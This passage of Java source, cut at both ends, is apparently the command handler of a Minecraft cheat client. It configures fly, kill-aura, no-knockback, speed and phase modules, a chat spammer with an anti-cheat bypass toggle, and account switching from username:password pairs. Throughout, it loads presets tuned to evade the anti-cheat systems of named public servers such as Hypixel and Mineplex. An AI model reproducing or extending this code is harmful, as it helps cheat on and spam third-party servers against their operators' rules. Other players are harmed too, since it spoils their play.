									+ Client.setmgr.getSettingByName(Fly.mod, "Speed").getValFloat());
						} else if (args[1].equalsIgnoreCase("kick")) {
							if (args[2].equalsIgnoreCase("true") || args[2].equalsIgnoreCase("false")) {
								Client.setmgr.getSettingByName(Fly.mod, "KickSafe")
										.setValBoolean(Boolean.parseBoolean(args[2].toLowerCase()));
								msg("§6Fly-Kick-ByPass set to: §4"
										+ (Client.setmgr.getSettingByName(Fly.mod, "KickSafe").getValBoolean()
												? "§aenabled"
												: "§cdisabled"));
							} else {
								msg("§cArgument must be §atrue §cor §afalse§c!");
							}
						}
					} catch (final NumberFormatException numformat) {
						msg("§cThis is not a number!");
					} catch (final ArrayIndexOutOfBoundsException outofbounds) {
						msg("§6Syntax: §4fly [speed [SPEED] / kick [true/false]]");
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §4fly [speed [SPEED] / kick [true/false]]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "off")) {
				Client.getModules().stream().filter((mods) -> (mods.isToggled())).forEachOrdered((mods) -> {
					Client.disable(mods.getName());
				});
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "login")) {
				if (cmd.length != 1) {
					try {
						String displayText;
						final String[] args = chatMessage.split(" ");
						final Logger logger = LogManager.getLogger();
						if (args.length == 3) {
							final YggdrasilAuthenticationService authenticationService = new YggdrasilAuthenticationService(
									Minecraft.proxy, "");
							final YggdrasilUserAuthentication authentication2 = (YggdrasilUserAuthentication) authenticationService
									.createUserAuthentication(Agent.MINECRAFT);
							authentication2.setUsername(args[1]);
							authentication2.setPassword(args[2]);
							try {
								authentication2.logIn();

								Minecraft.session = new Session(authentication2.getSelectedProfile().getName(),
										authentication2.getSelectedProfile().getId().toString(),
										authentication2.getAuthenticatedToken(), "mojang");
								displayText = "§a§lSuccessfully logged in!";
							} catch (final AuthenticationUnavailableException e) {
								displayText = "§4§lLogin Servers are down!";
							} catch (final AuthenticationException e) {
								displayText = e.getMessage().contains("§4§lUser or Password incorrect.")
										|| e.getMessage().toLowerCase().contains("account migrated")
												? "§4§lPassword incorrect!"
												: "§4§lUser or Password incorrect. §r§c(Maybe you are Mojang Banned!)";
								logger.error(e.getMessage());
							} catch (final NullPointerException e) {
								displayText = "§4§lPassword incorrect!";
							}
							if (displayText.equals("§a§lSuccessfully logged in!")) {
								sendQueue.handleDisconnect(
										new S40PacketDisconnect(new ChatComponentText("§aLogged in as §6"
												+ Minecraft.session.getUsername() + "§a! §4Please reconnect!")));
							} else {
								addChatMessage(new ChatComponentText(displayText));
							}
						}
						if (args.length == 2) {
							final String[] argsw = args[1].split(":");
							final YggdrasilAuthenticationService authenticationService = new YggdrasilAuthenticationService(
									Minecraft.proxy, "");
							final YggdrasilUserAuthentication authentication2 = (YggdrasilUserAuthentication) authenticationService
									.createUserAuthentication(Agent.MINECRAFT);
							authentication2.setUsername(argsw[0]);
							authentication2.setPassword(argsw[1]);
							try {
								authentication2.logIn();

								Minecraft.session = new Session(authentication2.getSelectedProfile().getName(),
										authentication2.getSelectedProfile().getId().toString(),
										authentication2.getAuthenticatedToken(), "mojang");
								displayText = "§a§lSuccessfully logged in!";
							} catch (final AuthenticationUnavailableException e) {
								displayText = "§4§lLogin Servers are down!";
							} catch (final AuthenticationException e) {
								displayText = e.getMessage().contains("§4§lUser or Password incorrect.")
										|| e.getMessage().toLowerCase().contains("account migrated")
												? "§4§lPassword incorrect!"
												: "§4§lUser or Password incorrect. §r§c(Maybe you are Mojang Banned!)";
								logger.error(e.getMessage());
							} catch (final NullPointerException e) {
								displayText = "§4§lPassword incorrect!";
							}
							if (displayText.equals("§a§lSuccessfully logged in!")) {
								sendQueue.handleDisconnect(
										new S40PacketDisconnect(new ChatComponentText("§aLogged in as §6"
												+ Minecraft.session.getUsername() + "§a! §4Please reconnect!")));
							} else {
								addChatMessage(new ChatComponentText(displayText));
							}
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §4login [NAME] [PASSWORD], login [NAME]:[PASSWORD]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "say")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						String message = args[1];
						int i = 1;
						while (++i < args.length) {
							message = String.valueOf(message) + " " + args[i];
						}
						sendQueue.addToSendQueue(new C01PacketChatMessage(message));
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §asay [MSG]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "strafe")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						final Float val5 = Float.parseFloat(args[1]);
						Client.setmgr.getSettingByName(Strafe.mod, "Speed").setValFloat(val5);
						msg("§6Strafe-Speed set to §4" + val5 + " §6.");
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Strafe-Speed: §4" + Client.setmgr.getSettingByName(Strafe.mod, "Speed").getValFloat());
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "phase")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						if (args[1].equalsIgnoreCase("new")) {
							Client.setmgr.getSettingByName(Phase.mod, "Mode").setValString("NEW");
							msg("§6Phase set to NEW!");
						}
						if (args[1].equalsIgnoreCase("skip")) {
							Client.setmgr.getSettingByName(Phase.mod, "Mode").setValString("SKIP");
							msg("§6Phase set to SKIP!");
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Phase-Modes: §4NEW, SKIP");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "name")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						String name = args[1];
						int i = 1;
						while (++i < args.length) {
							name = String.valueOf(name) + " " + args[i];
						}
						LoginManager.changeCrackedName(name);
						sendQueue.handleDisconnect(new S40PacketDisconnect(new ChatComponentText(
								"§aLogged in as §6" + Minecraft.session.getUsername() + "§a! §4Please reconnect!")));
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §aname [Cracked-Name]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "ghost")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						if (args[1].equalsIgnoreCase("add")) {
							if (MiscUtils.isInteger(args[2])) {
								if (Block.getIdFromBlock(Block.getBlockFromName(args[2])) == 0) {
									return;
								}
								GhostHand.ids.add(Integer.parseInt(args[2]));
								msg("§aAdded §6" + (Block.getBlockById(Integer.parseInt(args[2])).getLocalizedName()
										.contains("tile.")
												? Block.getBlockById(Integer.parseInt(args[2])).getLocalizedName()
														.replace("tile.", "").replace(".name", "")
												: Block.getBlockById(Integer.parseInt(args[2])).getLocalizedName())
										+ " §c(" + Block.getIdFromBlock(Block.getBlockFromName(args[2])) + ")§a.");
							} else {
								GhostHand.ids.add(Block.getIdFromBlock(Block.getBlockFromName(args[2])));
								msg("§aAdded §6"
										+ (Block.getBlockFromName(args[2]).getLocalizedName().contains("tile.")
												? Block.getBlockFromName(args[2]).getLocalizedName()
														.replace("tile.", "").replace(".name", "")
												: Block.getBlockFromName(args[2]).getLocalizedName())
										+ " §c(" + Block.getIdFromBlock(Block.getBlockFromName(args[2])) + ")§a.");
							}
						}
						if (args[1].equalsIgnoreCase("remove")) {
							if (MiscUtils.isInteger(args[2])) {
								if (Block.getIdFromBlock(Block.getBlockFromName(args[2])) == 0) {
									return;
								}
								final List<Integer> idsbefore = new ArrayList<>();
								GhostHand.ids.forEach((i) -> {
									idsbefore.add(i);
								});
								GhostHand.ids.clear();
								idsbefore.stream().filter((i) -> (!(i == Integer.parseInt(args[2]))))
										.forEachOrdered((i) -> {
											GhostHand.ids.add(i);
										});
								msg("§aRemoved §6" + (Block.getBlockById(Integer.parseInt(args[2])).getLocalizedName()
										.contains("tile.")
												? Block.getBlockById(Integer.parseInt(args[2])).getLocalizedName()
														.replace("tile.", "").replace(".name", "")
												: Block.getBlockById(Integer.parseInt(args[2])).getLocalizedName())
										+ " §c(" + Block.getIdFromBlock(Block.getBlockFromName(args[2])) + ")§a.");
							} else {
								final List<Integer> idsbefore = new ArrayList<>();
								GhostHand.ids.forEach((i) -> {
									idsbefore.add(i);
								});
								GhostHand.ids.clear();
								idsbefore.stream()
										.filter((i) -> (!(Block.getIdFromBlock(Block.getBlockFromName(args[2])) == i)))
										.forEachOrdered((i) -> {
											GhostHand.ids.add(i);
										});
								msg("§aRemoved §6"
										+ (Block.getBlockFromName(args[2]).getLocalizedName().contains("tile.")
												? Block.getBlockFromName(args[2]).getLocalizedName()
														.replace("tile.", "").replace(".name", "")
												: Block.getBlockFromName(args[2]).getLocalizedName())
										+ " §c(" + Block.getIdFromBlock(Block.getBlockFromName(args[2])) + ")§a.");
							}
						}
						if (args[1].equalsIgnoreCase("reset")) {
							GhostHand.ids.clear();
							GhostHand.ids.add(54);
							GhostHand.ids.add(130);
							GhostHand.ids.add(146);
							GhostHand.ids.add(58);
							GhostHand.ids.add(145);
							GhostHand.ids.add(154);
							GhostHand.ids.add(26);
						}
						if (args[1].equalsIgnoreCase("list")) {
							GhostHand.ids.forEach((i) -> {
								msg("§6" + (Block.getBlockById(i).getLocalizedName().contains("tile.")
										? Block.getBlockById(i).getLocalizedName().replace("tile.", "").replace(".name",
												"")
										: Block.getBlockById(i).getLocalizedName()));
							});
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §aghost add [ID/Name] / remove [ID/Name]/ reset / list]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "server")) {
				if (cmd.length == 1) {
					try {
						msg("§4IP: §7" + Client.getServer());
						msg("§4MOTD: §7" + mc.getCurrentServerData().serverMOTD);
						msg("§4Version: §7" + mc.getCurrentServerData().gameVersion);
						msg("§4-server [IP/MOTD/Version] to copy to ClipBoard!");
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					try {
						final String[] args = chatMessage.split(" ");
						if (args[1].equalsIgnoreCase("ip")) {
							msg("§4IP: §7" + Client.getServer() + " §6§lCOPIED!");
							EntityPlayerSP.copyToClipborad(Client.getServer());
						}
						if (args[1].equalsIgnoreCase("motd")) {
							msg("§4MOTD: §7" + mc.getCurrentServerData().serverMOTD + " §6§lCOPIED!");
							EntityPlayerSP.copyToClipborad(mc.getCurrentServerData().serverMOTD);
						}
						if (args[1].equalsIgnoreCase("version")) {
							EntityPlayerSP
									.msg("§4Version: §7" + mc.getCurrentServerData().gameVersion + " §6§lCOPIED!");
							EntityPlayerSP.copyToClipborad(mc.getCurrentServerData().gameVersion);
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "pl")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "plugins")) {
				try {
					Client.getModules().stream().filter((mod) -> !(!mod.getName().equals("Plugins")))
							.forEachOrdered((mod) -> {
								mod.toggle();
							});
				} catch (final Exception exception) {
					msg("§4Error: §c" + exception.toString());
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "spec")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "spectate")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						if (args[1].equalsIgnoreCase(Minecraft.thePlayer.getName())) {
							msg("§cWhy would you spectate yourself?! LOL");
							return;
						}

						for (final Object o : Minecraft.theWorld.loadedEntityList) {
							if (!(o instanceof EntityPlayer)) {
								continue;
							}
							final EntityPlayer ep = (EntityPlayer) o;
							if (ep.getName().equalsIgnoreCase(args[1])) {
								Minecraft.getMinecraft().func_175607_a(ep);
								msg("§6Now Spectating §5" + args[1] + "§6.");
								isSpectating = true;
								return;
							}
						}
						msg("§cThis player can not be spectated. (Maybe too far away)");
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					if (!isSpectating) {
						msg("§4Syntax: §6spec [Name]");
					}
					Minecraft.getMinecraft().func_175607_a(Minecraft.thePlayer);
					isSpectating = false;
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "step")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						try {
							Client.setmgr.getSettingByName(Step.mod, "Height")
									.setValFloat(Float.parseFloat(args[1].replace(",", ".")));
							msg("§6Step-Height set to §7" + args[1] + "§6.");
						} catch (final NumberFormatException e) {
							msg("§7" + args[1] + " §6is not a Number.");
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §astep [Step-Height]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "speed")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");
						for (final Module m : Client.getModules(Category.SPEED)) {
							if (m.getName().equalsIgnoreCase(args[1])) {
								Client.setmgr.getSettingByName(Speed.mod, "Mode").setValString(m.getName());
								Speed.updateMode();
								msg("§aSpeed-Mode updated to §6" + m.getName());
								return;
							}
						}

						String message = "";
						for (final String str : Speed.modes) {
							message = message.isEmpty() ? String.valueOf(String.valueOf(message)) + "§a" + str
									: String.valueOf(String.valueOf(message)) + "§8, §a" + str;
						}
						message = "§6Speed-Modes§7: " + message;
						msg(message);

						// if (Speed.modes.contains(args[1].toLowerCase())) {
						// Client.getValues().Speed_mode.setValue(args[1].toLowerCase());
						// Speed.updateMode();
						// msg("§aSpeed-Mode updated to §6" +
						// args[1].toUpperCase());
						// }
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					String message = "";
					for (final String str : Speed.modes) {
						message = message.isEmpty() ? String.valueOf(String.valueOf(message)) + "§a" + str
								: String.valueOf(String.valueOf(message)) + "§8, §a" + str;
					}
					message = "§6Speed-Modes§7: " + message;
					msg(message);
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "spammer")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						if (args[1].equalsIgnoreCase("delay")) {
							if (args.length == 2) {
								msg("§6Spammer-Delay is §a" + Spammer.delaySetting / 20 + " §6seconds.");
							} else {
								Spammer.delaySetting = (int) (Float.parseFloat(args[2]) * 20);
								FileManager.saveSpammer();
								msg("§6Spammer-Delay set to §a" + args[2] + " §6seconds.");
							}
						} else if (args[1].equalsIgnoreCase("bypass")) {
							if (args.length < 3) {
								msg("§6Syntax: §aspammer bypass [true/false]");
								return;
							}
							if (args[2].equalsIgnoreCase("false") || args[2].equalsIgnoreCase("true")) {
								Spammer.aacbypass = Boolean.parseBoolean(args[2]);
								msg("§6AAC-ByPass now §a" + (Spammer.aacbypass ? "enabled" : "disabled"));
							} else {
								msg("§6Syntax: §aspammer bypass [true/false]");
							}
						} else if (args[1].equalsIgnoreCase("msg")) {
							String msg = "";
							for (final String str : args) {
								if (!str.equalsIgnoreCase(Configs.commandPrefix + "spammer")
										&& !str.equalsIgnoreCase("msg")) {
									msg = msg.isEmpty() ? str : msg + " " + str;
								}
							}
							Spammer.msg = msg;
							FileManager.saveSpammer();
							msg("§6Spammer-MSG set to §a" + msg);
						} else {
							msg("§6Syntax: §aspammer [delay [DELAY] / bypass [true/false] / msg [MESSAGE]]");
						}

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §aspammer [delay [DELAY] / bypass [true/false] / msg [MESSAGE]]");
					msg("§6Current Message: §a" + Spammer.msg);
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "bind")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						if (args.length == 2
								&& (args[1].equalsIgnoreCase("clear") || args[1].equalsIgnoreCase("clearall"))) {
							Client.getModules().forEach((mod) -> {
								mod.keyCode = 0;
							});
							FileManager.saveKeybinds();
							msg("§aUnbound all Keys.");
							return;
						}

						String modName = "";
						String keyName = "";
						if (args.length > 1) {
							modName = args[1];
							if (args.length > 2) {
								keyName = args[2];
							}
						}
						final Module module = Client.getModule(modName);
						if (module == null) {
							msg("No Module named " + modName + ".");
							return;
						}
						if (!module.isToggleable) {
							msg(module.name + " can't be binded.");
							return;
						}
						if (keyName.isEmpty()) {
							msg(module.name + "'s KeyBind has been cleared.");
							module.keyCode = 0;
							FileManager.saveKeybinds();
							return;
						}
						module.keyCode = Keyboard.getKeyIndex(keyName.toUpperCase());
						FileManager.saveKeybinds();
						if (Keyboard.getKeyIndex(keyName.toUpperCase()) == 0) {
							msg("Invalid Key! KeyBind cleared.");
						} else {
							msg(module.name + " bound to " + keyName);

							String mods = "";
							for (final Module mod : Client.getModules()) {
								if (mod.getKeyCode() == Keyboard.getKeyIndex(keyName.toUpperCase())
										&& !mod.getName().equals(module.name)) {
									if (mods.isEmpty()) {
										mods = "§cWARNING: §a" + mod.getName();
									} else {
										mods = mods + ", " + mod.getName();
									}
								}
							}
							if (!mods.isEmpty()) {
								mods = mods + (mods.split(", ").length != 1 ? " §chave " : " §chas ")
										+ "the same keybind!";
								msg(mods);
							}
						}

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §abind [module] [key]; bind clear/clearall");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "team")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						Team.color = EnumChatFormatting.getValueByName(args[1]);
						msg("§6Team Color set to " + args[1]);

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §ateam [Color]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "prefix")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						if (args[1].equals("*")) {
							msg("§cYou can not use * as prefix.");
							return;
						}
						Configs.commandPrefix = args[1];
						FileManager.saveMain();
						msg("§6Command Prefix set to §a" + args[1]);

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §aprefix [Command-Prefix]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "backport")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						Client.setmgr.getSettingByName(BackPort.mod, "maxFallDistance")
								.setValFloat(Float.parseFloat(args[1].replace(",", ".")));
						msg("§6BackPort Fall-Distance set to §a" + args[1]);

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §abackport [max. Fall-Distance]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "give")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						final EntityPlayer var3 = this;
						final Item itm = getItemByText(args[1]);
						final int count = args.length >= 3 ? parseInt(args[2], 1, 64) : 1;
						final int meta = args.length >= 4 ? Integer.parseInt(args[3]) : 0;
						final ItemStack item = new ItemStack(itm, count, meta);
						if (itm == null) {
							msg("Not found.");
							return;
						}

						if (args.length >= 5) {
							final String var8 = getChatComponentFromNthArg(var3, args, 4, false).getUnformattedText();

							try {
								item.setTagCompound(JsonToNBT.parse(var8));
							} catch (final NBTException var10) {
								msg("§cAn Error with the NBT Tags occured.");
							}
						}

						sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(
								Minecraft.thePlayer.inventory.getFirstEmptyStackReal(), item));

						EntityItem var9;

						if (item.stackSize <= 0) {
							item.stackSize = 1;
							var3.func_174794_a(CommandResultStats.Type.AFFECTED_ITEMS, count);
							var9 = var3.dropPlayerItemWithRandomChoice(item, false);

							if (var9 != null) {
								var9.func_174870_v();
							}
						} else {
							var3.func_174794_a(CommandResultStats.Type.AFFECTED_ITEMS, count - item.stackSize);
							var9 = var3.dropPlayerItemWithRandomChoice(item, false);

							if (var9 != null) {
								var9.setNoPickupDelay();
								var9.setOwner(var3.getName());
							}
						}

						msg("§aGiven [§6" + item.getDisplayName() + "§a] §7* §6" + count);

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §agive [item] [amount] [data] [dataTag]");
					if (!Minecraft.thePlayer.capabilities.isCreativeMode) {
						msg("§4CREATIVE ONLY!");
					}
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "nbtinfo")) {
				if (cmd.length == 1) {
					try {
						msg(Minecraft.thePlayer.getCurrentEquippedItem().getTagCompound().toString());
						copyToClipborad(Minecraft.thePlayer.getCurrentEquippedItem().getTagCompound().toString());
					} catch (final NullPointerException enull) {
						if (Minecraft.thePlayer.getCurrentEquippedItem() != null) {
							msg("§4Error: §cThis Item has no NBT-Data!");
						} else {
							msg("§4Error: §cYou are not holding an item!");
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Gives you Information about the current Item.");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "nbtedit")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						final ItemStack var7 = Minecraft.thePlayer.getCurrentEquippedItem();
						if (var7 == null) {
							return;
						}

						final String var8 = getChatComponentFromNthArg(this, args, 1, false).getUnformattedText();

						try {
							Minecraft.thePlayer.getCurrentEquippedItem().setTagCompound(JsonToNBT.parse(var8));
							Minecraft.playerController.sendSlotPacket(Minecraft.thePlayer.getCurrentEquippedItem(),
									mc.thePlayer.inventory.currentItem + 36);
							msg("§6NBT-Tags edited! §a" + var8);
						} catch (final NBTException var10) {
							msg("§cAn Error with the NBT Tags occured.");
						}

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §anbtedit [dataTag]");
					if (!Minecraft.thePlayer.capabilities.isCreativeMode) {
						msg("§4CREATIVE ONLY!");
					}
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "cmdblock")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						if (!Minecraft.thePlayer.capabilities.isCreativeMode) {
							msg("§4CREATIVE ONLY!");
							return;
						}

						String message = args[1];
						int i = 1;
						while (++i < args.length) {
							message = String.valueOf(message) + " " + args[i];
						}
						createCmdBlock(message);

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §acmdblock [command]");
					if (!Minecraft.thePlayer.capabilities.isCreativeMode) {
						msg("§4CREATIVE ONLY!");
					}
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "ping")) {
				if (cmd.length == 1) {
					try {
						for (final Object obj : Minecraft.getNetHandler().playerInfoMap.values()) {
							if (!(obj instanceof NetworkPlayerInfo)) {
								return;
							}
							final NetworkPlayerInfo player = (NetworkPlayerInfo) obj;
							if (!StringUtils.stripControlCodes(player.getGameProfile().getName())
									.equals(StringUtils.stripControlCodes(Minecraft.thePlayer.getName()))) {
								continue;
							}
							msg("§aYour ping is §c" + player.responseTime + "ms§a.");
							break;
						}
					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §aping");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "fastweb")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "fw")) {
				if (cmd.length != 1) {
					try {
						final String[] args = chatMessage.split(" ");

						if (MiscUtils.isDouble(args[1])) {
							Client.setmgr.getSettingByName(FastWeb.mod, "Speed")
									.setValFloat(Float.parseFloat(args[1].replace(",", ".")));
							msg("§6FastWeb-Speed set to §a" + Float.parseFloat(args[1].replace(",", ".")));
						} else {
							msg("§cThis is not a number!");
						}

					} catch (final Exception exception) {
						msg("§4Error: §c" + exception.toString());
					}
				} else {
					msg("§6Syntax: §afastweb [MULTIPLIER]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "script")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "s")) {
				switch (cmd.length) {
				case 2:
					try {
						final String[] args = chatMessage.split(" ");

						if (args[1].equalsIgnoreCase("Rewi") || args[1].equalsIgnoreCase("Rewinside")
								|| args[1].equalsIgnoreCase("R")) {
							for (final Category asd : Category.values()) {
								Client.disable(asd);
							}
							Client.setmgr.getSettingByName(YesCheat.mod, "Mode").setValString("Gomme");
							YesCheat.updateMode();
							YesCheat.mode = Mode.Gomme;
							Client.enable("NoRotSet");
							Client.enable("YesCheat");
							Client.enable("NoKnockBack");
							Client.enable("InventoryWalk");
							Client.enable("AutoArmor");

							Client.setmgr.getSettingByName(AutoArmor.mod, "Delay").setValFloat(5);
							Client.setmgr.getSettingByName(Scaffold.mod, "Expanded").setValBoolean(false);
							Client.setmgr.getSettingByName(NoKnockBack.mod, "V").setValFloat(0);
							Client.setmgr.getSettingByName(NoKnockBack.mod, "H").setValFloat(0);
							Client.setmgr.getSettingByName(KillAura.mod, "Range").setValFloat(4.0f);
							Client.setmgr.getSettingByName(KillAura.mod, "HurtCheck").setValBoolean(false);
							Client.setmgr.getSettingByName(Speed.mod, "Mode").setValString("SlowBHop");
							Client.setmgr.getSettingByName(AutoArmor.mod, "OnlyInventory").setValBoolean(true);
							Client.setmgr.getSettingByName(KillAura.mod, "OnlyIngame").setValBoolean(true);
							Client.setmgr.getSettingByName(KillAura.mod, "RandomCPS").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "HyPixel").setValBoolean(false);
							Client.setmgr.getSettingByName(Tower.mod, "Mode").setValString("SlowJump");
							Client.setmgr.getSettingByName(KillAura.mod, "Delay").setValFloat(1);

							msg("§aDefault Rewinside Settings loaded!");
						}

						if (args[1].equalsIgnoreCase("M") || args[1].equalsIgnoreCase("Mineplex")
								|| args[1].equalsIgnoreCase("MP")) {
							for (final Category asd : Category.values()) {
								Client.disable(asd);
							}
							Client.setmgr.getSettingByName(YesCheat.mod, "Mode").setValString("AAC");
							YesCheat.updateMode();
							YesCheat.mode = Mode.AAC;
							Client.enable("NoRotSet");
							Client.enable("YesCheat");
							Client.enable("NoKnockBack");
							Client.enable("InventoryWalk");
							Client.enable("AutoArmor");
							Client.enable("NoFall");

							Client.setmgr.getSettingByName(AutoArmor.mod, "Delay").setValFloat(0);
							Client.setmgr.getSettingByName(Scaffold.mod, "Expanded").setValBoolean(true);
							Client.setmgr.getSettingByName(Scaffold.mod, "Expand").setValFloat(5.0f);
							Client.setmgr.getSettingByName(NoKnockBack.mod, "V").setValFloat(0);
							Client.setmgr.getSettingByName(NoKnockBack.mod, "H").setValFloat(0);
							Client.setmgr.getSettingByName(KillAura.mod, "Range").setValFloat(4.3f);
							Client.setmgr.getSettingByName(KillAura.mod, "HurtCheck").setValBoolean(false);
							Client.setmgr.getSettingByName(Speed.mod, "Mode").setValString("AAC2");
							Client.setmgr.getSettingByName(AutoArmor.mod, "OnlyInventory").setValBoolean(true);
							Client.setmgr.getSettingByName(KillAura.mod, "OnlyIngame").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "RandomCPS").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "HyPixel").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "Mineplex").setValBoolean(true);
							Client.setmgr.getSettingByName(Fly.mod, "KickSafe").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "Delay").setValFloat(1);

							msg("§aDefault Mineplex Settings loaded!");
						}

						if (args[1].equalsIgnoreCase("Hypixel") || args[1].equalsIgnoreCase("HyPxl")) {
							for (final Category asd : Category.values()) {
								Client.disable(asd);
							}
							Client.setmgr.getSettingByName(YesCheat.mod, "Mode").setValString("NCP");
							YesCheat.updateMode();
							YesCheat.mode = Mode.NCP;
							Client.enable("NoRotSet");
							Client.enable("YesCheat");
							Client.enable("NoKnockBack");
							Client.enable("InventoryWalk");
							Client.enable("NoSlowdown");
							Client.enable("AutoArmor");

							Client.setmgr.getSettingByName(AutoArmor.mod, "OnlyInventory").setValBoolean(true);
							Client.setmgr.getSettingByName(AutoArmor.mod, "Delay").setValFloat(5);
							Client.setmgr.getSettingByName(Scaffold.mod, "Expanded").setValBoolean(false);
							Client.setmgr.getSettingByName(NoKnockBack.mod, "V").setValFloat(0);
							Client.setmgr.getSettingByName(NoKnockBack.mod, "H").setValFloat(0);
							Client.setmgr.getSettingByName(KillAura.mod, "Range").setValFloat(4.3f);
							Client.setmgr.getSettingByName(KillAura.mod, "HurtCheck").setValBoolean(false);
							Client.setmgr.getSettingByName(Speed.mod, "Mode").setValString("BHop");
							Client.setmgr.getSettingByName(KillAura.mod, "OnlyIngame").setValBoolean(true);
							Client.setmgr.getSettingByName(KillAura.mod, "OnlyIngame").setValBoolean(true);
							Client.setmgr.getSettingByName(Step.mod, "New").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "RandomCPS").setValBoolean(false);
							Client.setmgr.getSettingByName(KillAura.mod, "HyPixel").setValBoolean(true);
							Client.setmgr.getSettingByName(KillAura.mod, "Mineplex").setValBoolean(false);
							Client.setmgr.getSettingByName(Tower.mod, "Mode").setValString("TimerJump");
							Client.setmgr.getSettingByName(LongJump.mod, "Mode").setValString("NCP");
							Client.setmgr.getSettingByName(KillAura.mod, "Delay").setValFloat(1);

							msg("§aDefault Hypixel Settings loaded!");
						}

						if (args[1].equalsIgnoreCase("Gomme") || args[1].equalsIgnoreCase("G")) {
							for (final Category asd : Category.values()) {
								Client.disable(asd);
